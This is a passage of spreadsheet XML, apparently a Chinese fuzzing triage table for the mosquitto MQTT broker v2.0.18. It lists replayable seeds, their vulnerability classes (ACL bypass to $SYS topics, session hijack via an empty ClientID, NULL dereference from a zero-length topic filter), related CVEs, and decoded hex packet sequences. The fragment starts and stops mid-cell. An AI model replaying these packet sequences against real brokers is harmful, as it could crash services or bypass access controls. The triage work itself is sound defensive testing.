raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[13]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[14]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[15]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[16]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[17]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[18]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[19]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[20]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[21]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[22]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[23]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[24]: (不完整,3B) raw=00e000\u000a(尾部3B): 00e000</f>
        <v/>
      </c>
      <c r="F5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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J56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6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65">
      <c r="A565" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B565" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C565" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1165B)\u000a4.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0x02c4\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E565" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 2549B (报告+请求数据)\u000a请求数据: 1165B\u000a\u000a---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MQTT请求序列(1165B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10756c6c000026261726262626262626\u000aMsg[2]: PUBCOMP PacketID=25344 | raw_header=70696300646576656c31466c6576656c\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626100000002626262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626001026262626262626\u000aMsg[5]: PUBREL PacketID=13546 | raw_header=656c34ea1124736861ff7fff006c6c54\u000aMsg[6]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[7]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[8]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[9]: (不完整,554B) raw=4a833f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000a(尾部554B): 4a833f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f</f>
        <v/>
      </c>
      <c r="F5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56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565" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J56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565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66">
      <c r="A566" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B566" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C566" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(1632B)\u000a4.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566" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c6 ===\u000a大小: 2718B (报告+请求数据)\u000a请求数据: 1632B\u000a\u000a---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MQTT请求序列(1632B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='$SYS/broke        ' QoS=3 retain=True payload='      ' | raw_header=371a0012245359532f62726f6b652020\u000aMsg[2]: CONNACK  | raw_header=2000\u000aMsg[3]: CONNACK session_present=32 reason_code=32 | raw_header=20202020202020202020202020202020\u000aMsg[4]: CONNACK session_present=32 reason_code=32 | raw_header=20202020202020202020202026262626\u000aMsg[5]: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raw_header=26262626262626262626262626262626\u000a(尾部694B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F5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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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6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67">
      <c r="A567" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:02ce</t>
        </is>
      </c>
      <c r="B567" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C567" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:3,cat:02ce)中的REQUEST DATA提取出来(3436B)\u000a4.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0x02ce\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E567" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02ce ===\u000a大小: 7620B (报告+请求数据)\u000a请求数据: 3436B\u000a\u000a---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MQTT请求序列(3436B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=20037 | raw_header=444f4e454d63204b6363636363636363\u000aMsg[2]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[3]: PUBREL PacketID=25443 | raw_header=636363636363636363636363636c7400\u000aMsg[4]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[5]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[6]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[7]: PUBREL PacketID=25443 | raw_header=63636363236363636363636363636363\u000aMsg[8]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[9]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[10]: PUBCOMP  | raw_header=7500\u000aMsg[11]: TYPE0  | raw_header=044d51546c2f7a6c740a57696c6c4d73\u000aMsg[12]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[13]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[14]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[15]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[16]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636363\u000aMsg[17]: PUBREL PacketID=25443 | raw_header=63636363636363636363636363636340\u000aMsg[18]: PUBREC PacketID=19301 | raw_header=51204b656570516c6976013d35205769\u000aMsg[19]: PUBREL PacketID=27725 | raw_header=696c6c4d73673d77696c6c5f61636363\u000aMsg[20]: (不完整,1716B) raw=f0f0f0f0f0f0f0f0f0f0636363636363636363636363636363636363636363636363636363636363\u000a(尾部1716B): f0f0f0f0f0f0f0f0f0f063636363636363636363636363636363636363636363636363636363636363636363636363636363</f>
        <v/>
      </c>
      <c r="F5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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J56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6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68">
      <c r="A568" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B568" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C568" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(583B)\u000a4.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0x0305\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E568" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 1436B (报告+请求数据)\u000a请求数据: 583B\u000a\u000a---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MQTT请求序列(583B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: TYPE0  | raw_header=03e8000d73656e736f722f2b2b2b2b2b\u000aMsg[3]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[4]: PUBLISH  | raw_header=3c00\u000aMsg[5]: TYPE0  | raw_header=0d70657273697374656e745f3031820b\u000aMsg[6]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[7]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[8]: (不完整,184B) raw=38ff7f38383838383838383817383838383838383838383838383838383838383838383838383838\u000a(尾部184B): 38ff7f3838383838383838381738383838383838383838383838383838383838383838383838383838383838383838383838</f>
        <v/>
      </c>
      <c r="F5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6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68" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J56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6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69">
      <c r="A569" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B569" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C569" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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69" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0306 ===\u000a大小: 1438B (报告+请求数据)\u000a请求数据: 190B\u000a\u000a---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MQTT请求序列(190B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1013004d5154540402003c000766757a\u000aMsg[2]: PUBLISH Topic='$SYS/broke' QoS=0 retain=False payload='r/upll_ksg\x82\x17\x00\x0f\x00\x12$SYS/bð)\x18'\x15\x00\x08external' | raw_header=3031000a245359532f62726f6b65722f\u000aMsg[3]: CONNECT  | raw_header=1600\u000aMsg[4]: TYPE0  | raw_header=063a47e4f5cd0c1f0010617574685f69\u000aMsg[5]: CONNACK session_present=44 reason_code=44 | raw_header=2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c\u000aMsg[6]: (不完整,10B) raw=2c2c2c2c2c2c72792f23\u000a(尾部10B): 2c2c2c2c2c2c72792f23</f>
        <v/>
      </c>
      <c r="F5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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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6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70">
      <c r="A570" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0307</t>
        </is>
      </c>
      <c r="B570" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C570" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(21953B)\u000a4. 使用MQTT二进制协议回放工具连接到127.0.0.1:1883发送种子序列\u000a5. 分析服务器响应并验证协议安全属性违规\u000a\u000a【独立复现验证结果】(2026-06-21)\u000a- AFLNet Oracle: 检测到15个安全属性违规\u000a- 最大严重性级别: Sev3\u000a- 违规类别代码: 0x0307\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E570" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0307 ===\u000a大小: 6739B (报告+请求数据)\u000a请求数据: 21953B\u000a\u000a---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MQTT请求序列(21953B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[5]: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raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[8]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[9]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[10]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[11]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[12]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[13]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[14]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[15]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[16]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[17]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[18]: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raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[21]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[22]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[23]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[24]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000aMsg[25]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a\u000a(尾部2634B): 3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a</f>
        <v/>
      </c>
      <c r="F5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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J57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7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71">
      <c r="A571" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B571" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C571" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D5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571" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0385 ===\u000a大小: 1010B (报告+请求数据)\u000a请求数据: 90B\u000a\u000a---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MQTT请求序列(90B原始二进制) ---\u000aMsg[1]: CONNECT Proto=M\x00TT v4 ClientID=''(0B) clean_session=False keepalive=291s [持久会话] | raw_header=101300044d0054540400012300001268\u000aMsg[2]: CONNECT  | raw_header=1000\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: (不完整,65B) raw=0040a2110002000d73656e736f722f2b2f74656d703017001173656e736f722f726f6f6d312f7465\u000a(尾部65B): 0040a2110002000d73656e736f722f2b2f74656d703017001173656e736f722f726f6f6d312f74656d7032322e353211000c</f>
        <v/>
      </c>
      <c r="F5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7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71" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J57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57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72">
      <c r="A572" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B572" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C572" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(328B)\u000a4.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0x0386\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E572" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0386 ===\u000a大小: 2115B (报告+请求数据)\u000a请求数据: 328B\u000a\u000a---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MQTT请求序列(328B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v3 ClientID='fuzz_c6'(7B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540302003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=4891 Topics=['very/deep/topic/level1/level2/level3/level4'(QoS=1), 'a/b/c/d/e'(QoS=0)] | raw_header=8251131b002b766572792f646565702f\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=49B | raw_header=3b50001d245359532f62726f6b65722f\u000aMsg[4]: PUBLISH Topic='very/deep/topic/level1/level2/l\x88vel3/level4' QoS=1 retain=True payload='\x13\x1cT\x11Ïàx' | raw_header=3b34002b766572792f646565702f746f\u000aMsg[5]: UNSUBSCRIBE  | raw_header=a2110002000d73656e736f722f2b2f74\u000aMsg[6]: PUBLISH Topic='sensor/room1/temp' QoS=0 retain=False payload='22.5' | raw_header=3017001173656e736f722f726f6f6d31\u000aMsg[7]: PUBLISH Topic='cmd/light/on' QoS=1 retain=False payload='\x00\x051' | raw_header=3211000c636d642f6c696768742f6f6e\u000aMsg[8]: PUBLISH Topic='cmd/light/on' QoS=2 retain=False payload='\x00\x061' | raw_header=3411000c636d642f6c696768742f6f6e\u000aMsg[9]: PUBREC PacketID=6 | raw_header=50020006\u000aMsg[10]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F5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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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73">
      <c r="A573" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:0387</t>
        </is>
      </c>
      <c r="B573" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C573" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(233B)\u000a4.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0x0387\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E573" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0387 ===\u000a大小: 1256B (报告+请求数据)\u000a请求数据: 233B\u000a\u000a---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MQTT请求序列(233B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=['s#\x10sor/+/temp'(QoS=0)] | raw_header=87120001000d732310736f722f2b2f74\u000aMsg[2]: AUTH  | raw_header=f000\u000aMsg[3]: TYPE0  | raw_header=0002000d\u000aMsg[4]: PUBCOMP PacketID=28275 | raw_header=73656e736fc141414141414182ca5017\u000aMsg[5]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=2)] | raw_header=820b00010006746573742f2302\u000aMsg[6]: SUBSCRIBE PacketID=1331 Topics=['$share/grp1/#'(QoS=0)] | raw_header=82120533000d2473686172652f677270\u000aMsg[7]: PUBLISH Topic='$SYSA3\x13\x00\u000atest/topic\x00\x1ahello4#\x00' QoS=0 retain=True payload='\x12$SYS/brok\x00\x01\x00\x00' | raw_header=392d001d24535953413313000a746573\u000aMsg[8]: (不完整,24B) raw=70745f6d65001b7b2274656d70223a32c000357dc000e000\u000a(尾部24B): 70745f6d65001b7b2274656d70223a32c000357dc000e000</f>
        <v/>
      </c>
      <c r="F5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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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7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74">
      <c r="A574" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:3,cat:03c4</t>
        </is>
      </c>
      <c r="B574" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C574" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:3,cat:03c4)中的REQUEST DATA提取出来(1191B)\u000a4.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574" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:03c4 ===\u000a大小: 1877B (报告+请求数据)\u000a请求数据: 1191B\u000a\u000a---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MQTT请求序列(1191B原始二进制) ---\u000aMsg[1]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[2]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[4]: PUBREL PacketID=9766 | raw_header=66262626262626262626262626262626\u000aMsg[5]: PUBACK PacketID=9766 | raw_header=46262626262626262626262626262626\u000aMsg[6]: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PUBACK PacketID=9766 | raw_header=46262626262626262626262626262626\u000aMsg[10]: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(不完整,671B) raw=26ff2626262626262626262626262626262626262626262626262626262626262626262626262626\u000a(尾部671B): 26ff262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F5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7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74" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J57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574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575">
      <c r="A575" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B575" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C575" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(32B)\u000a4.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75" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 534B (报告+请求数据)\u000a请求数据: 32B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(32B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=189 Topics=[''(零长度!QoS=2)] | raw_header=821d00bd00000a746573742f746f7069\u000aMsg[2]: TYPE0  | raw_header=0e</f>
        <v/>
      </c>
      <c r="F5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7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75" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J57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7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76">
      <c r="A576" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B576" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C576" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D5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76" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 583B (报告+请求数据)\u000a请求数据: 40B\u000a\u000a---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MQTT请求序列(40B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=821200010000044d5154540402003c00\u000aMsg[2]: CONNECT  | raw_header=1100\u000aMsg[3]: TYPE0  | raw_header=0200\u000aMsg[4]: TYPE0  | raw_header=0d06746573742f23\u000aMsg[5]: (不完整,8B) raw=0030140006746500\u000a(尾部8B): 0030140006746500</f>
        <v/>
      </c>
      <c r="F5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7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76" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J57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57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77">
      <c r="A577" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:004a</t>
        </is>
      </c>
      <c r="B577" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C577" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:4,cat:004a)中的REQUEST DATA提取出来(22B)\u000a4.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0x004a\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E577" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:004a ===\u000a大小: 2731B (报告+请求数据)\u000a请求数据: 22B\u000a\u000a---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CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(22B原始二进制) ---\u000aMsg[1]: (不完整,22B) raw=82f800120000002f93656e6c5f311bff950001007465\u000a(尾部22B): 82f800120000002f93656e6c5f311bff950001007465</f>
        <v/>
      </c>
      <c r="F5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7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77" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J57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7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78">
      <c r="A578" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B578" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C578" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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78" s="2">
